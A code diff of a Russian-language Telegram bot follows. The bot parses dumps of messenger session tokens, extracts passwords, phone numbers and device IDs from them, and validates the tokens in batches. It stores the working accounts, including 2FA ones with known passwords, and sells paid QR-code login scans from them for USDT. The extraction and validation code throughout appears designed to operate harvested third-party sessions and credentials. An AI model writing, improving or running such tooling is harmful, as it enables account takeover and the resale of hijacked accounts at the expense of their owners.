@@ -252,7 +252,7 @@ class QRScanner:
         finally:
             self.conn.close()
 
-# ==================== ИЗВЛЕЧЕНИЕ ПАРОЛЯ ИЗ ТОКЕНА ====================
+# ==================== ИЗВЛЕЧЕНИЕ ПАРОЛЯ ====================
 
 class TokenPasswordExtractor:
     @staticmethod
@@ -260,221 +260,148 @@ class TokenPasswordExtractor:
         if not token or len(token) < 20:
             return ""
         
-        password = TokenPasswordExtractor._extract_from_base64_parts(token)
+        password = TokenPasswordExtractor._extract_json_password(token)
         if password:
             return password
         
-        password = TokenPasswordExtractor._extract_from_json_in_token(token)
+        password = TokenPasswordExtractor._extract_from_base64(token)
         if password:
             return password
         
-        password = TokenPasswordExtractor._extract_by_patterns(token)
-        if password:
-            return password
-        
-        password = TokenPasswordExtractor._extract_from_full_decode(token)
+        password = TokenPasswordExtractor._extract_pattern_password(token)
         if password:
             return password
         
         return ""
     
     @staticmethod
-    def _extract_from_base64_parts(token: str) -> str:
-        parts = re.split(r'[\._\-]', token)
+    def _extract_json_password(text: str) -> str:
+        json_patterns = [
+            r'\{[^{}]*"password"\s*:\s*"([^"]+)"[^{}]*\}',
+            r'\{[^{}]*"pass"\s*:\s*"([^"]+)"[^{}]*\}',
+            r'\{[^{}]*"pwd"\s*:\s*"([^"]+)"[^{}]*\}',
+        ]
+        
+        for pattern in json_patterns:
+            matches = re.findall(pattern, text)
+            for match in matches:
+                if 3 <= len(match) <= 50:
+                    return match
+        return ""
+    
+    @staticmethod
+    def _extract_from_base64(text: str) -> str:
+        parts = re.split(r'[\._\-]', text)
         
         for part in parts:
-            if len(part) < 8 or len(part) > 100:
+            if len(part) < 8 or len(part) > 200:
                 continue
             
             for padding in ['', '=', '==', '===']:
                 try:
                     decoded = base64.b64decode(part + padding).decode('utf-8', errors='ignore')
                     
-                    password = TokenPasswordExtractor._find_password_in_text(decoded)
+                    password = TokenPasswordExtractor._extract_json_password(decoded)
                     if password:
                         return password
                     
-                    if 4 <= len(decoded) <= 30 and not decoded.startswith('{'):
-                        if re.search(r'[A-Za-z]', decoded) and re.search(r'[0-9!@#$%^&*]', decoded):
+                    if 4 <= len(decoded) <= 30:
+                        if re.match(r'^[A-Za-z0-9@#$%^&*!]+$', decoded):
                             return decoded
                 except:
                     continue
-        
         return ""
     
     @staticmethod
-    def _extract_from_json_in_token(token: str) -> str:
-        json_patterns = [
-            r'\{[^}]*"password"\s*:\s*"([^"]+)"[^}]*\}',
-            r'\{[^}]*"pass"\s*:\s*"([^"]+)"[^}]*\}',
-            r'\{[^}]*"pwd"\s*:\s*"([^"]+)"[^}]*\}',
-        ]
-        
-        for pattern in json_patterns:
-            match = re.search(pattern, token)
-            if match:
-                return match.group(1)
-        
-        return ""
-    
-    @staticmethod
-    def _extract_by_patterns(token: str) -> str:
+    def _extract_pattern_password(text: str) -> str:
         patterns = [
-            r'password[:=]([A-Za-z0-9@#$%^&*!]+)',
-            r'pass[:=]([A-Za-z0-9@#$%^&*!]+)',
-            r'pwd[:=]([A-Za-z0-9@#$%^&*!]+)',
-            r'passwd[:=]([A-Za-z0-9@#$%^&*!]+)',
+            r'password=([A-Za-z0-9@#$%^&*!]+)',
+            r'pass=([A-Za-z0-9@#$%^&*!]+)',
+            r'pwd=([A-Za-z0-9@#$%^&*!]+)',
+            r'"password"\s*:\s*"([^"]+)"',
+            r'"pass"\s*:\s*"([^"]+)"',
+            r'"pwd"\s*:\s*"([^"]+)"',
         ]
         
         for pattern in patterns:
-            match = re.search(pattern, token, re.IGNORECASE)
+            match = re.search(pattern, text, re.IGNORECASE)
             if match:
                 password = match.group(1)
-                if 4 <= len(password) <= 30:
+                if 3 <= len(password) <= 50:
                     return password
-        
         return ""
-    
-    @staticmethod
-    def _extract_from_full_decode(token: str) -> str:
-        try:
-            padded = token + '=' * (4 - len(token) % 4) if len(token) % 4 else token
-            decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
-            
-            password = TokenPasswordExtractor._find_password_in_text(decoded)
-            if password:
-                return password
-        except:
-            pass
-        
-        try:
-            decoded = base64.urlsafe_b64decode(token + '==').decode('utf-8', errors='ignore')
-            password = TokenPasswordExtractor._find_password_in_text(decoded)
-            if password:
-                return password
-        except:
-            pass
-        
-        return ""
-    
-    @staticmethod
-    def _find_password_in_text(text: str) -> str:
-        try:
-            json_objects = re.findall(r'\{[^{}]+\}', text)
-            for json_str in json_objects:
-                try:
-                    data = json.loads(json_str)
-                    for key in ['password', 'pass', 'pwd', 'passwordHash']:
-                        if key in data and isinstance(data[key], str):
-                            return data[key]
-                except:
-                    continue
-        except:
-            pass
-        
-        patterns = [
-            r'"password"\s*:\s*"([^"]+)"',
-            r'password=([^\s&]+)',
-            r'pass=([^\s&]+)',
-            r'pwd=([^\s&]+)',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, text)
-            if match:
-                return match.group(1)
-        
-        return ""
-    
-    @staticmethod
-    def extract_all_info_from_token(token: str) -> dict:
-        info = {
-            "password": "",
-            "device_id": "",
-            "phone": "",
-            "user_id": ""
-        }
-        
-        info["password"] = TokenPasswordExtractor.extract_password_from_token(token)
-        
-        device_patterns = [
-            r'"deviceId"\s*:\s*"([^"]+)"',
-            r'deviceId=([^\s&]+)',
-            r'device_id=([^\s&]+)',
-        ]
-        for pattern in device_patterns:
-            match = re.search(pattern, token)
-            if match:
-                info["device_id"] = match.group(1)
-                break
-        
-        phone_patterns = [
-            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',
-            r'"phone"\s*:\s*"([^"]+)"',
-        ]
-        for pattern in phone_patterns:
-            match = re.search(pattern, token)
-            if match:
-                phone = match.group(0) if match.lastindex is None else match.group(1)
-                if len(phone) > 5:
-                    info["phone"] = phone
-                    break
-        
-        id_patterns = [
-            r'"userId"\s*:\s*(\d+)',
-            r'"user_id"\s*:\s*(\d+)',
-            r'"id"\s*:\s*(\d+)',
-        ]
-        for pattern in id_patterns:
-            match = re.search(pattern, token)
-            if match:
-                info["user_id"] = match.group(1)
-                break
-        
-        return info
 
-# ==================== УНИВЕРСАЛЬНЫЙ ПАРСЕР ТОКЕНОВ ====================
+# ==================== УНИВЕРСАЛЬНЫЙ ПАРСЕР ====================
 
 class UniversalTokenParser:
     @staticmethod
     def extract_token(text: str) -> str:
         patterns = [
-            r'(?:token|access_token|auth_token)["\s:=]+([A-Za-z0-9\-_=+]{50,})',
             r'(An_[A-Za-z0-9\-_=+]{50,})',
             r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)',
-            r'([A-Za-z0-9+/=]{50,})',
+            r'([A-Za-z0-9+/=]{80,})',
         ]
         
         for pattern in patterns:
-            match = re.search(pattern, text)
-            if match:
-                token = match.group(1)
+            matches = re.findall(pattern, text)
+            for match in matches:
+                token = match if isinstance(match, str) else match[0]
                 if not token.startswith('{') and not token.startswith('const') and len(token) > 50:
                     return token
         return None
     
     @staticmethod
-    def extract_device_info(text: str, token: str = None) -> dict:
+    def extract_password(text: str, token: str = None) -> str:
+        if token:
+            password = TokenPasswordExtractor.extract_password_from_token(token)
+            if password:
+                return password
+        
+        password = TokenPasswordExtractor._extract_json_password(text)
+        if password:
+            return password
+        
+        password = TokenPasswordExtractor._extract_pattern_password(text)
+        if password:
+            return password
+        
+        lines = text.strip().split('\n')
+        for line in lines:
+            line = line.strip()
+            
+            if len(line) > 50 or len(line) < 4:
+                continue
+            
+            if line.startswith('{') or line.startswith('const') or line.startswith('An_'):
+                continue
+            
+            has_letter = bool(re.search(r'[A-Za-z]', line))
+            has_digit_or_special = bool(re.search(r'[0-9@#$%^&*!]', line))
+            
+            if has_letter and has_digit_or_special:
+                return line
+            
+            if re.match(r'^[A-Za-z0-9@#$%^&*!]+$', line) and not line.startswith('An_'):
+                return line
+        
+        return ""
+    
+    @staticmethod
+    def extract_device_info(text: str) -> dict:
         device_info = {}
         
-        json_patterns = [
-            r'\{[^}]*"deviceType"[^}]*\}',
-            r'\{[^}]*"deviceId"[^}]*\}',
-            r'\{[^}]*"userAgent"[^}]*\}',
-        ]
-        
-        for pattern in json_patterns:
-            match = re.search(pattern, text, re.DOTALL)
-            if match:
-                try:
-                    data = json.loads(match.group(0))
-                    if "userAgent" in data:
-                        device_info.update(data["userAgent"])
-                    else:
-                        device_info.update(data)
+        json_matches = re.findall(r'\{[^{}]+"device(?:Type|Id)"[^{}]+\}', text)
+        for json_str in json_matches:
+            try:
+                data = json.loads(json_str)
+                if "userAgent" in data:
+                    device_info.update(data["userAgent"])
+                else:
+                    device_info.update(data)
+                if "deviceId" in device_info:
                     break
-                except:
-                    continue
+            except:
+                continue
         
         if not device_info:
             fields = {
@@ -497,51 +424,28 @@ class UniversalTokenParser:
                     else:
                         device_info[field] = match.group(1)
         
-        if "deviceId" not in device_info and token:
-            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
-            if token_info.get("device_id"):
-                device_info["deviceId"] = token_info["device_id"]
-        
         return device_info
     
     @staticmethod
-    def extract_password(text: str, token: str = None) -> str:
-        if token:
-            password = TokenPasswordExtractor.extract_password_from_token(token)
-            if password:
-                return password
-        
-        patterns = [
-            r'(?:password|pass|pwd)["\s:=]+([^\s\n"]+)',
-            r'(?:^|\n)([A-Za-z0-9@#$%^&*!]{4,30})(?:\n|$)',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, text, re.IGNORECASE)
-            if match:
-                password = match.group(1)
-                if (not password.startswith('An_') and 
-                    not password.startswith('const') and 
-                    len(password) > 3 and 
-                    len(password) < 50):
-                    return password
-        
-        return ""
-    
-    @staticmethod
     def extract_phone(text: str) -> str:
-        patterns = [
-            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',
+        phone_patterns = [
+            r'\+\d{1,3}\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}',
+            r'\d{3}\s?\d{3}\s?\d{2}\s?\d{2}',
             r'"phone"\s*:\s*"([^"]+)"',
             r'"phoneNumber"\s*:\s*"([^"]+)"',
         ]
         
-        for pattern in patterns:
+        for pattern in phone_patterns:
             match = re.search(pattern, text)
             if match:
                 phone = match.group(0) if match.lastindex is None else match.group(1)
-                if len(phone) > 5:
+                if len(phone) >= 7:
                     return phone
+        
+        device_match = re.search(r'"deviceName"\s*:\s*"([^"]+)"', text)
+        if device_match:
+            return device_match.group(1)
+        
         return ""
     
     @staticmethod
@@ -550,6 +454,7 @@ class UniversalTokenParser:
             r'customPayload\s*=\s*"(\d+)"',
             r'"customPayload"\s*:\s*"(\d+)"',
             r'"customPayload"\s*:\s*(\d+)',
+            r'const\s+customPayload\s*=\s*"(\d+)"',
         ]
         
         for pattern in patterns:
@@ -573,16 +478,12 @@ class UniversalTokenParser:
                 continue
             
             password = UniversalTokenParser.extract_password(block, token)
-            device_info = UniversalTokenParser.extract_device_info(block, token)
+            device_info = UniversalTokenParser.extract_device_info(block)
             phone = UniversalTokenParser.extract_phone(block)
             custom_payload = UniversalTokenParser.extract_custom_payload(block)
             
             if "deviceId" not in device_info:
-                token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
-                if token_info.get("device_id"):
-                    device_info["deviceId"] = token_info["device_id"]
-                else:
-                    device_info["deviceId"] = str(uuid.uuid4())
+                device_info["deviceId"] = str(uuid.uuid4())
             
             results.append({
                 "token": token,
@@ -633,19 +534,16 @@ class UniversalTokenParser:
                     break
         
         if not token:
-            json_str = json.dumps(data)
-            token = UniversalTokenParser.extract_token(json_str)
-        
-        if not token:
             return None
         
-        password = TokenPasswordExtractor.extract_password_from_token(token)
+        password = ""
+        for pwd_field in ["password", "pass", "pwd", "passwordHash"]:
+            if pwd_field in data:
+                password = str(data[pwd_field])
+                break
         
         if not password:
-            for pwd_field in ["password", "pass", "pwd", "passwordHash"]:
-                if pwd_field in data:
-                    password = str(data[pwd_field])
-                    break
+            password = TokenPasswordExtractor.extract_password_from_token(token)
         
         device_info = {}
         if "userAgent" in data:
@@ -655,29 +553,17 @@ class UniversalTokenParser:
         elif "device" in data:
             device_info.update(data["device"])
         
-        device_id = data.get("deviceId") or data.get("device_id") or device_info.get("deviceId")
-        
-        if not device_id:
-            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
-            if token_info.get("device_id"):
-                device_id = token_info["device_id"]
-        
-        if not device_id:
-            device_id = str(uuid.uuid4())
-        
+        device_id = data.get("deviceId") or data.get("device_id") or device_info.get("deviceId") or str(uuid.uuid4())
         device_info["deviceId"] = device_id
         
         phone = data.get("phone") or data.get("phoneNumber") or data.get("phone_number") or ""
-        
         if not phone:
             user_data = data.get("user") or data.get("profile") or {}
             if isinstance(user_data, dict):
                 phone = user_data.get("phone") or user_data.get("phoneNumber") or ""
         
         if not phone:
-            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
-            if token_info.get("phone"):
-                phone = token_info["phone"]
+            phone = device_info.get("deviceName", "unknown")
         
         custom_payload = data.get("customPayload") or data.get("custom_payload")
         if custom_payload:
@@ -763,12 +649,6 @@ def add_account(token: str, device_info: dict, password: str = "", phone: str = 
         password = TokenPasswordExtractor.extract_password_from_token(token)
     
     device_id = device_info.get("deviceId", str(uuid.uuid4()))
-    
-    if device_id == str(uuid.uuid4()):
-        token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
-        if token_info.get("device_id"):
-            device_id = token_info["device_id"]
-            device_info["deviceId"] = device_id
     
     acc_id = str(uuid.uuid4())[:8]
     accounts[acc_id] = {
@@ -864,37 +744,128 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
         if data:
             return {"valid": True}
         
-        return {"valid": False, "error": "Unknown response format"}
+        return {"valid": False, "error": "Unknown response"}
         
     except Exception as e:
-        logger.error(f"Token validation error: {e}")
         return {"valid": False, "error": str(e)}
     finally:
         scanner.conn.close()
 
-# ==================== БЕЗОПАСНАЯ ОТПРАВКА СООБЩЕНИЙ ====================
+# ==================== ОБРАБОТКА ТОКЕНОВ С ВАЛИДАЦИЕЙ ====================
 
-async def safe_send_message(chat_id: int, text: str, parse_mode: str = None, **kwargs):
-    """Безопасная отправка сообщений с обработкой ошибок HTML"""
+async def process_tokens_with_validation(content: str) -> list:
+    """Обрабатывает токены и сразу проверяет их"""
+    results = []
+    
+    # Сначала парсим все токены
+    parsed_tokens = []
+    
     try:
-        # Экранируем проблемные символы если нужно
-        if parse_mode == "HTML":
-            # Заменяем неправильные пробелы в тегах
-            text = text.replace("< b>", "<b>").replace("< /b>", "</b>")
-            text = text.replace("< i>", "<i>").replace("< /i>", "</i>")
-            text = text.replace("< code>", "<code>").replace("< /code>", "</code>")
+        data = json.loads(content)
+        parsed = UniversalTokenParser.parse_json_data(data)
+        parsed_tokens.extend(parsed)
+    except json.JSONDecodeError:
+        pass
+    
+    if not parsed_tokens:
+        lines = content.strip().split('\n')
+        json_objects = []
+        text_blocks = []
+        current_block = []
+        
+        for line in lines:
+            line_stripped = line.strip()
+            if not line_stripped:
+                if current_block:
+                    text_blocks.append('\n'.join(current_block))
+                    current_block = []
+                continue
             
-        return await bot.send_message(chat_id, text, parse_mode=parse_mode, **kwargs)
-    except Exception as e:
-        logger.error(f"Error sending message: {e}")
-        # Пробуем отправить без форматирования
-        try:
-            # Убираем все HTML теги
-            clean_text = re.sub(r'<[^>]+>', '', text)
-            return await bot.send_message(chat_id, clean_text, **kwargs)
-        except Exception as e2:
-            logger.error(f"Error sending plain message: {e2}")
-            return None
+            try:
+                data = json.loads(line_stripped)
+                if isinstance(data, dict):
+                    json_objects.append(data)
+                    continue
+            except json.JSONDecodeError:
+                pass
+            
+            current_block.append(line)
+        
+        if current_block:
+            text_blocks.append('\n'.join(current_block))
+        
+        for json_obj in json_objects:
+            parsed = UniversalTokenParser.parse_single_json(json_obj)
+            if parsed:
+                parsed_tokens.append(parsed)
+        
+        for block in text_blocks:
+            parsed = UniversalTokenParser.parse_text_block(block)
+            parsed_tokens.extend(parsed)
+    
+    # Проверяем каждый токен
+    for token_data in parsed_tokens:
+        token = token_data["token"]
+        phone = token_data.get("phone", "unknown")
+        password = token_data.get("password", "")
+        device_info = token_data.get("device_info", {})
+        custom_payload = token_data.get("custom_payload")
+        
+        result = {
+            "phone": phone,
+            "password": password,
+            "status": "",
+            "error": ""
+        }
+        
+        # Проверяем дубликат
+        if is_duplicate_token(token):
+            result["status"] = "duplicate"
+            results.append(result)
+            continue
+        
+        # Проверяем токен
+        validation = await validate_token(token, device_info.get("deviceId", str(uuid.uuid4())), device_info)
+        
+        if validation["valid"]:
+            if validation.get("has_2fa"):
+                if password:
+                    # 2FA с паролем - добавляем
+                    add_result = add_account(token, device_info, password, phone, custom_payload)
+                    if add_result == "added":
+                        result["status"] = "added"
+                        result["password"] = password
+                    else:
+                        result["status"] = "duplicate"
+                else:
+                    # 2FA без пароля - пропускаем
+                    result["status"] = "2fa_no_pass"
+                    result["error"] = "2FA without password"
+            else:
+                # Валидный токен - добавляем
+                add_result = add_account(token, device_info, password, phone, custom_payload)
+                if add_result == "added":
+                    result["status"] = "added"
+                    result["password"] = password
+                else:
+                    result["status"] = "duplicate"
+        else:
+            # Невалидный токен
+            error = validation.get("error", "Unknown error")
+            result["status"] = "error"
+            result["error"] = error
+            
+            # Проверяем на спамблок
+            if "spam" in error.lower() or "block" in error.lower():
+                result["spam_blocked"] = True
+            
+            # Проверяем на неправильный пароль
+            if "password" in error.lower() or "wrong" in error.lower():
+                result["error"] = f"login.cred: {error}"
+        
+        results.append(result)
+    
+    return results
 
 # ==================== КЛАВИАТУРЫ ====================
 
@@ -924,36 +895,32 @@ async def start(message: types.Message):
     is_admin = user_id == ADMIN_ID
     balance = get_user_balance(user_id)
     group_id = get_user_group(user_id)
-    
-    if group_id:
-        group_text = f"привязана к группе <code>{group_id}</code>"
-    else:
-        group_text = "не привязаны ни к одной группе"
+    group_text = f"привязана к группе <code>{group_id}</code>" if group_id else "не привязаны ни к одной группе"
     
     kb = admin_keyboard() if is_admin else main_keyboard()
     
-    text = (
-        "🤖 <b>ДОБРО ПОЖАЛОВАТЬ!</b>\n\n"
-        "Я бот для автосканирования QR MAX в группах.\n\n"
-        "📌 <b>КАК ЭТО РАБОТАЕТ:</b>\n"
-        "1. Добавьте бота в свою группу (<b>обязательно выдайте права администратора</b>)\n"
-        "2. Напишите в этой группе: /link\n"
-        "3. Группа будет привязана к вашему аккаунту\n"
-        "4. Пополните баланс (кнопка ниже)\n"
-        "5. Любой участник группы сможет писать /qr\n"
-        "6. $ будут списываться с ВАШЕГО баланса\n\n"
+    await message.answer(
+        f"🤖 <b>ДОБРО ПОЖАЛОВАТЬ!</b>\n\n"
+        f"Я бот для автосканирования QR MAX в группах.\n\n"
+        f"📌 <b>КАК ЭТО РАБОТАЕТ:</b>\n"
+        f"1. Добавьте бота в свою группу (<b>обязательно выдайте права администратора</b>)\n"
+        f"2. Напишите в этой группе: /link\n"
+        f"3. Группа будет привязана к вашему аккаунту\n"
+        f"4. Пополните баланс (кнопка ниже)\n"
+        f"5. Любой участник группы сможет писать /qr\n"
+        f"6. $ будут списываться с ВАШЕГО баланса\n\n"
         f"💰 Ваш баланс: <b>${balance:.2f}</b>\n"
         f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
         f"📌 Вы {group_text}\n\n"
-        "<i>Приятного использования!</i>"
+        f"<i>Приятного использования!</i>",
+        parse_mode="HTML",
+        reply_markup=kb
     )
-    
-    await safe_send_message(message.chat.id, text, parse_mode="HTML", reply_markup=kb)
 
 @dp.message(F.text == "/link")
 async def link_group(message: types.Message):
     if message.chat.type not in ["group", "supergroup"]:
-        await safe_send_message(message.chat.id, "❌ Эта команда работает только в группах!")
+        await message.answer("❌ Эта команда работает только в группах!")
         return
     
     user_id = message.from_user.id
@@ -962,9 +929,9 @@ async def link_group(message: types.Message):
     if group_id in groups:
         owner = groups[group_id]["owner_id"]
         if str(user_id) == owner:
-            await safe_send_message(message.chat.id, "✅ Эта группа уже привязана к вашему аккаунту!")
+            await message.answer("✅ Эта группа уже привязана к вашему аккаунту!")
         else:
-            await safe_send_message(message.chat.id, "❌ Эта группа уже привязана к другому аккаунту!")
+            await message.answer("❌ Эта группа уже привязана к другому аккаунту!")
         return
     
     groups[group_id] = {
@@ -980,38 +947,46 @@ async def link_group(message: types.Message):
     
     save_all()
     
-    text = f"✅ Группа успешно привязана!\n\nВладелец: <code>{user_id}</code>\nТеперь участники могут использовать /qr"
-    await safe_send_message(message.chat.id, text, parse_mode="HTML")
+    await message.answer(
+        f"✅ Группа успешно привязана!\n\n"
+        f"Владелец: <code>{user_id}</code>\n"
+        f"Теперь участники могут использовать /qr",
+        parse_mode="HTML"
+    )
 
 @dp.message(F.text == "/qr")
 async def qr_command(message: types.Message, state: FSMContext):
     if message.chat.type not in ["group", "supergroup"]:
         if not accounts:
-            await safe_send_message(message.chat.id, "❌ Нет доступных аккаунтов для сканирования.")
+            await message.answer("❌ Нет доступных аккаунтов для сканирования.")
             return
-        await safe_send_message(message.chat.id, "📷 Отправьте фото QR-кода для сканирования.")
+        await message.answer("📷 Отправьте фото QR-кода для сканирования.")
         await state.set_state(AuthState.waiting_for_qr)
         return
     
     group_id = str(message.chat.id)
     
     if group_id not in groups:
-        await safe_send_message(message.chat.id, "❌ Эта группа не привязана. Владелец группы должен написать /link")
+        await message.answer("❌ Эта группа не привязана. Владелец группы должен написать /link")
         return
     
     owner_id = int(groups[group_id]["owner_id"])
     balance = get_user_balance(owner_id)
     
     if balance < PRICE_PER_QR:
-        text = f"❌ Недостаточно средств у владельца группы.\nБаланс: ${balance:.2f}\nЦена QR: ${PRICE_PER_QR:.2f}"
-        await safe_send_message(message.chat.id, text, parse_mode="HTML")
+        await message.answer(
+            f"❌ Недостаточно средств у владельца группы.\n"
+            f"Баланс: ${balance:.2f}\n"
+            f"Цена QR: ${PRICE_PER_QR:.2f}",
+            parse_mode="HTML"
+        )
         return
     
     if not accounts:
-        await safe_send_message(message.chat.id, "❌ Нет доступных аккаунтов для сканирования. Попробуйте позже.")
+        await message.answer("❌ Нет доступных аккаунтов для сканирования. Попробуйте позже.")
         return
     
-    await safe_send_message(message.chat.id, "📷 Отправьте фото QR-кода для сканирования.")
+    await message.answer("📷 Отправьте фото QR-кода для сканирования.")
     await state.set_state(AuthState.waiting_for_qr)
     await state.update_data(group_id=group_id, owner_id=owner_id)
 
@@ -1021,7 +996,7 @@ async def handle_qr_photo(message: types.Message, state: FSMContext):
     group_id = data.get("group_id")
     owner_id = data.get("owner_id", message.from_user.id)
     
-    msg = await safe_send_message(message.chat.id, "⏳ Распознаю QR-код...")
+    msg = await message.answer("⏳ Распознаю QR-код...")
     
     try:
         photo = message.photo[-1]
@@ -1048,7 +1023,7 @@ async def handle_qr_photo(message: types.Message, state: FSMContext):
         await msg.edit_text("❌ QR-код не найден на фото.")
         
     except Exception as e:
-        await msg.edit_text(f"❌ Ошибка распознавания: {str(e)}")
+        await msg.edit_text(f"❌ Ошибка распознавания: {e}")
 
 async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
     qr_link = qr_input
@@ -1084,7 +1059,6 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await state.clear()
         return
     
-    # Списываем средства
     users[owner_uid]["balance"] -= PRICE_PER_QR
     users[owner_uid]["total_scans"] = users[owner_uid].get("total_scans", 0) + 1
     save_users()
@@ -1108,7 +1082,6 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         await asyncio.sleep(0.5)
     
     if result is None:
-        # Возвращаем средства
         users[owner_uid]["balance"] += PRICE_PER_QR
         users[owner_uid]["total_scans"] -= 1
         save_users()
@@ -1136,12 +1109,10 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
         del accounts[acc_id]
         save_all()
     else:
-        # Возвращаем средства
         users[owner_uid]["balance"] += PRICE_PER_QR
         users[owner_uid]["total_scans"] -= 1
         save_users()
-        error_msg = result.get('error', 'неизвестно')
-        await msg.edit_text(f"❌ Ошибка: {error_msg}")
+        await msg.edit_text(f"❌ Ошибка: {result.get('error', 'неизвестно')}")
     
     await state.clear()
 
@@ -1150,7 +1121,7 @@ async def process_group_qr(message, state, qr_input, msg, owner_id, group_id):
 @dp.callback_query(F.data == "topup")
 async def cb_topup(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(AuthState.waiting_topup_amount)
-    await safe_send_message(callback.message.chat.id, "💳 Введите сумму пополнения в USDT:")
+    await callback.message.answer("💳 Введите сумму пополнения в USDT:")
     await callback.answer()
 
 @dp.message(AuthState.waiting_topup_amount)
@@ -1158,11 +1129,11 @@ async def handle_topup(message: types.Message, state: FSMContext):
     try:
         amount = float(message.text.strip())
     except:
-        await safe_send_message(message.chat.id, "❌ Введите число.")
+        await message.answer("❌ Введите число.")
         return
     
     if amount <= 0:
-        await safe_send_message(message.chat.id, "❌ Сумма должна быть больше 0.")
+        await message.answer("❌ Сумма должна быть больше 0.")
         return
     
     url = "https://pay.crypt.bot/api/createInvoice"
@@ -1191,12 +1162,17 @@ async def handle_topup(message: types.Message, state: FSMContext):
             builder.row(InlineKeyboardButton(text="💳 Оплатить", url=invoice_url))
             builder.row(InlineKeyboardButton(text="✅ Я оплатил", callback_data=f"check_payment_{invoice_id}"))
             
-            text = f"💳 <b>Счёт на пополнение</b>\n\nСумма: <b>${amount:.2f}</b>\nНажмите кнопку для оплаты, затем «Я оплатил»"
-            await safe_send_message(message.chat.id, text, parse_mode="HTML", reply_markup=builder.as_markup())
+            await message.answer(
+                f"💳 <b>Счёт на пополнение</b>\n\n"
+                f"Сумма: <b>${amount:.2f}</b>\n"
+                f"Нажмите кнопку для оплаты, затем «Я оплатил»",
+                parse_mode="HTML",
+                reply_markup=builder.as_markup()
+            )
         else:
-            await safe_send_message(message.chat.id, f"❌ Ошибка создания счёта: {data.get('error')}")
+            await message.answer(f"❌ Ошибка создания счёта: {data.get('error')}")
     except Exception as e:
-        await safe_send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
+        await message.answer(f"❌ Ошибка: {e}")
     
     await state.clear()
 
@@ -1231,7 +1207,7 @@ async def cb_check_payment(callback: types.CallbackQuery):
         else:
             await callback.answer("❌ Счёт не найден.", show_alert=True)
     except Exception as e:
-        await callback.answer(f"❌ Ошибка проверки: {str(e)}", show_alert=True)
+        await callback.answer(f"❌ Ошибка проверки: {e}", show_alert=True)
 
 # ==================== ПРОФИЛЬ ====================
 
@@ -1242,14 +1218,19 @@ async def cb_profile(callback: types.CallbackQuery):
     group_id = get_user_group(user_id)
     total_scans = users.get(str(user_id), {}).get("total_scans", 0)
     
-    text = f"👤 <b>Ваш профиль</b>\n\n💰 Баланс: <b>${balance:.2f}</b>\n📷 Всего сканов: <b>{total_scans}</b>\n💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
+    text = (
+        f"👤 <b>Ваш профиль</b>\n\n"
+        f"💰 Баланс: <b>${balance:.2f}</b>\n"
+        f"📷 Всего сканов: <b>{total_scans}</b>\n"
+        f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>\n"
+    )
     
     if group_id:
         text += f"📌 Группа: <code>{group_id}</code>"
     else:
         text += "📌 Не привязаны к группе"
     
-    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
+    await callback.message.answer(text, parse_mode="HTML")
     await callback.answer()
 
 # ==================== ИЗМЕНЕНИЕ БАЛАНСА АДМИНОМ ====================
@@ -1262,7 +1243,7 @@ async def cb_admin_edit_balance(callback: types.CallbackQuery, state: FSMContext
     await state.set_state(AuthState.waiting_edit_balance_user)
     
     if not users:
-        await safe_send_message(callback.message.chat.id, "❌ Нет пользователей в базе.")
+        await callback.message.answer("❌ Нет пользователей в базе.")
         await state.clear()
         return
     
@@ -1278,7 +1259,7 @@ async def cb_admin_edit_balance(callback: types.CallbackQuery, state: FSMContext
     
     users_list += "Введите ID пользователя для изменения баланса:"
     
-    await safe_send_message(callback.message.chat.id, users_list, parse_mode="HTML")
+    await callback.message.answer(users_list, parse_mode="HTML")
     await callback.answer()
 
 @dp.message(AuthState.waiting_edit_balance_user)
@@ -1289,20 +1270,27 @@ async def handle_edit_balance_user(message: types.Message, state: FSMContext):
     try:
         user_id = int(message.text.strip())
     except:
-        await safe_send_message(message.chat.id, "❌ Введите корректный ID пользователя (число).")
+        await message.answer("❌ Введите корректный ID пользователя (число).")
         return
     
     uid = str(user_id)
     if uid not in users:
-        await safe_send_message(message.chat.id, f"❌ Пользователь с ID <code>{user_id}</code> не найден.", parse_mode="HTML")
+        await message.answer(f"❌ Пользователь с ID <code>{user_id}</code> не найден.", parse_mode="HTML")
         return
     
     await state.update_data(edit_user_id=user_id)
     await state.set_state(AuthState.waiting_edit_balance_amount)
     
     current_balance = users[uid].get("balance", 0)
-    text = f"👤 Пользователь: <code>{user_id}</code>\n💰 Текущий баланс: <b>${current_balance:.2f}</b>\n\nВведите <b>новый баланс</b> (число) или используйте:\n• <code>+50</code> — добавить 50\n• <code>-10</code> — снять 10\n• <code>100</code> — установить 100"
-    await safe_send_message(message.chat.id, text, parse_mode="HTML")
+    await message.answer(
+        f"👤 Пользователь: <code>{user_id}</code>\n"
+        f"💰 Текущий баланс: <b>${current_balance:.2f}</b>\n\n"
+        f"Введите <b>новый баланс</b> (число) или используйте:\n"
+        f"• <code>+50</code> — добавить 50\n"
+        f"• <code>-10</code> — снять 10\n"
+        f"• <code>100</code> — установить 100",
+        parse_mode="HTML"
+    )
 
 @dp.message(AuthState.waiting_edit_balance_amount)
 async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
